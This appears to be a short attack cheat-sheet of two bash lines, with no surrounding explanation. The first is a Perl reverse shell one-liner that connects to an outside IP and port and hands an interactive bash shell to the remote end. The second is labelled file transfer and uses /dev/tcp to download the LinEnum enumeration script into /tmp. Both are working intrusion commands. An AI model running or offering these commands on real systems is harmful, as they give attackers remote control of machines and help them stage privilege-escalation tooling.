
```bash
perl -e 'use Socket;$i="10.10.14.123";$p=8001;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/bash -i");};'
# file transfer
bash -c "cat < /dev/tcp/$IP/$PORT > /tmp/LinEnum.sh"

```